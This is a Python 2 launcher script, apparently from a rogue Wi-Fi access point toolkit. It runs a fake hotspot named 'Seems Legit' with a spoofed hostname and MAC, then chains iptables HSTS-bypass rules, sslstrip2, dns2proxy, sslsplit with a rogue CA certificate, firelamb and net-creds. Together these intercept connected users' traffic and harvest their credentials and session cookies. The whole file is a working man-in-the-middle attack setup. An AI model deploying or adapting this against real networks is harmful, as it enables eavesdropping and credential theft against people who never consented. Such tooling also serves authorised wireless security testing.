import plugins
import core
import os
import time

from sys import exit
from multiprocessing import Process

CA_CERT = '../run-mana/cert/rogue-ca.pem'
CA_KEY = '../run-mana/cert/rogue-ca.key'

BANNER = '''
                               _              _ _    _ _   
                              | |            | | |  (_) |  
 _ __ ___   __ _ _ __   __ _  | |_ ___   ___ | | | ___| |_ 
| '_ ` _ \ / _` | '_ \ / _` | | __/ _ \ / _ \| | |/ / | __|
| | | | | | (_| | | | | (_| | | || (_) | (_) | |   <| | |_ 
|_| |_| |_|\__,_|_| |_|\__,_|  \__\___/ \___/|_|_|\_\_|\__|
                                                           
                                                           
'''

def am_i_root():

    if os.geteuid():
        exit('[-] Why am I not root? I want root!')

def configure():

    return {

        'phy' : 'wlp0s29u1u5',
        'filter_ip' : None,
        'upstream' : 'enp0s25',
        'sslstrip2' : {

            'logfile' : 'sslstrip2.log',
            'port' : 10000,
            'fav' : False,
            'killSessions' : False,
        },
        'bssid' : '00:11:22:33:44:00',
        'ssid' : 'Seems Legit',
        'channel' : 6,
    }

if __name__ == "__main__":

    am_i_root()

    configs = configure()

    print BANNER

    core.iptables.flush()

    core.utils.hostname('WRT54G')
    core.utils.rfkill()
    core.utils.macchanger(configs['phy'])

    plugins.hostapd.configure_nat_full(phy=configs['phy'],
                                    bssid=configs['bssid'],
                                    ssid=configs['ssid'],
                                    channel=configs['channel'])

    core.utils.route.add_nat_full(configs['phy'])

    core.utils.set_ip_forward(1)

    plugins.dhcpd.configure_nat_full()

    core.iptables.nat_full(upstream=configs['upstream'], phy=configs['phy'])

    core.iptables.hsts_bypass(phy=configs['phy'], sslstrip_port=configs['sslstrip2']['port'])

    core.iptables.sslsplit(phy=configs['phy'])
    
    hostapd = Process(target=plugins.hostapd.hostapd)
    hostapd.daemon = True
    print '[*] starting hostapd...'
    hostapd.start()
    print '[*] hostapd started'

    dhcpd = Process(target=plugins.dhcpd.dhcpd, args=(configs['phy'],))
    dhcpd.daemon = True
    print '[*] starting dhcpd...'
    dhcpd.start()
    print '[*] dhcpd started'

    # start sslstrip2
    #TODO make sure you pass the following flags: -a -w
    sslstrip2 = Process(target=plugins.sslstrip2, args=(configs['sslstrip2']['logfile'],
            configs['sslstrip2']['port'],
            configs['sslstrip2']['fav'],
            configs['sslstrip2']['killSessions'],))
    sslstrip2.daemon = True
    print '[*] starting sslstrip2...'
    sslstrip2.start()
    print '[*] sslstrip2 started'

    time.sleep(2)

    dns2proxy = Process(target=plugins.dns2proxy, args=(configs['phy'],))
    dns2proxy.daemon = True
    print '[*] starting dns2proxy...'
    dns2proxy.start()
    print '[*] dns2proxy started'

    time.sleep(2)

    # start sslsplit
    sslsplit = plugins.sslsplit.Sslsplit(debug=True,
                            enable_passthru=True,
                            disable_compression=True,
                            ca_cert=CA_CERT,
                            ca_key=CA_KEY)

    sslsplit.start()

    time.sleep(2)

    # start FireLamb
    firelamb = Process(target=plugins.firelamb, args=(configs['phy'],))
    firelamb.daemon = True
    print '[*] starting firelamb...'
    firelamb.start()
    print '[*] firelamb started'

    net_creds = Process(target=plugins.net_creds, args=(configs['phy'],))
    net_creds.daemon = True
    print '[*] starting net-creds...'
    net_creds.start()
    print '[*] net-creds started'

    time.sleep(2)

    raw_input('Press enter to exit...')

    net_creds.terminate()
    sslstrip2.terminate()
    dhcpd.terminate()
    hostapd.terminate()
    firelamb.terminate()

    net_creds.join()
    sslstrip2.join()
    dhcpd.join()
    hostapd.join()
    firelamb.join()

    sslsplit.stop()

    core.iptables.flush()
    core.utils.set_ip_forward(0)
